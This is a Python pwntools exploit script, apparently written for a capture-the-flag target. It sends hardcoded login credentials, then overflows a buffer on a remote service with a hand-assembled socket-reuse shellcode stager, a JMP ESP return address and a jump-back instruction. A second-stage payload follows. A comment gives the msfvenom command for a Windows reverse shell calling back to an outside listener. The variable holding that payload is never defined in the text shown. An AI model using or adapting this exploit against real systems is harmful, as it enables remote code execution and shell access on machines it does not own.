from pwn import *

PORT = 9999
ADDRESS = '10.10.11.115'
context.log_level = 'debug'
USERNAME = b'alfiansyah'
PASSWORD = b'K3r4j@@nM4j@pAh!T'
FULLNAME = b'Vickry Alfiansyah'
INPUTCODE = b'T3D83CbJkl1299 '

#JMP_ESP = p32(0x719023a8) # other jmp esp locations
#JMP_ESP = p32(0x719023b1)
#JMP_ESP = p32(0x719023ba)
#JMP_ESP = p32(0x719023c3)
JMP_ESP = p32(0x7190239F) ### this one looks good

WS2_32RECVACTUAL = p32(0x719082ac)

# first buffer overflow
OFFSET1 = 1090
# 2nd buffer overflow
OFFSET2 = 66

# Stager1 -  sets up the recv socket
SOCKET_REUSE_STAGER =  b'\x54'                    # push esp
SOCKET_REUSE_STAGER += b'\x58'                    # push eax
SOCKET_REUSE_STAGER += b'\x66\x83\xc0\x48'        # add ax,48
SOCKET_REUSE_STAGER += b'\xff\x30'                # push [eax]
SOCKET_REUSE_STAGER += b'\x5e'                    # pop ESI
SOCKET_REUSE_STAGER += b'\x83\xec\x74'            # sub esp, 0x74
SOCKET_REUSE_STAGER += b'\x33\xdb'                # xor ebx,ebx
SOCKET_REUSE_STAGER += b'\x53'                    # push ebx
SOCKET_REUSE_STAGER += b'\x80\xc7\x08'            # add bh, 0x8
SOCKET_REUSE_STAGER += b'\x80\xc7\x08'		  # add bh, 0x8
SOCKET_REUSE_STAGER += b'\x53'                    # push ebx
SOCKET_REUSE_STAGER += b'\x54'                    # push esp
SOCKET_REUSE_STAGER += b'\x5b'                    # pop ebx
SOCKET_REUSE_STAGER += b'\x83\xc3\x7c' 		  # add ebx,0xc8
SOCKET_REUSE_STAGER += b'\x83\xc3\x4c' 	   	  # 7c + 4c = c8 wouldn't let me do \x00's
SOCKET_REUSE_STAGER += b'\xff\x33' 		  # push [EBX]
SOCKET_REUSE_STAGER += b'\x56'                    # push esi
SOCKET_REUSE_STAGER += b'\xa1' + WS2_32RECVACTUAL # mov eax,DWORD PTR DS:[719082AC]  	#originally was ==> mov ebx, ws2_32actual did not work
SOCKET_REUSE_STAGER += b'\xff\xd0'                # call eax 				#originally was ==> call ebx did not work
## Calls the Payload
SOCKET_REUSE_STAGER += b'\x54'			  # push esp
SOCKET_REUSE_STAGER += b'\x58'			  # push eax
SOCKET_REUSE_STAGER += b'\x66\x83\xc0\x7c'        # add, 7c
SOCKET_REUSE_STAGER += b'\x66\x83\xc0\x44'	  # add, 44 total of c0 once again had to do 2 because could not add the \x00's in the payload
SOCKET_REUSE_STAGER += b'\xff\x10'		  # call [eax]

# lets generate an easier reverse shell payload.
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.123 LPORT=9004 -f python -v payload


buffer1 = SOCKET_REUSE_STAGER
buffer1 += b'\x90' * (OFFSET2 - len(SOCKET_REUSE_STAGER))
buffer1 += JMP_ESP # address of jmp esp where buffer overwrite will occur
buffer1 += b'\xEB\xB8' # jmp back to socket reuse stager
buffer1 += b'\x90' * 500 # only have like 10 more bytes to write to here if that

conn = remote(ADDRESS,PORT)
conn.recvuntil(b'Username: ')
conn.send(USERNAME)
conn.recvuntil(b'Password: ')
conn.send(PASSWORD)
conn.recvuntil(b'FullName: ')
conn.send(FULLNAME)
conn.recvuntil(b'Input Your Code: ')
conn.send(buffer1)

log.info("EIP Successfully written to.")
time.sleep(1)
conn.send(payload + b'\x90' * (4096 - len(payload)))
log.info("Payload Successfully Sent")
log.info("check for shell")
conn.close()

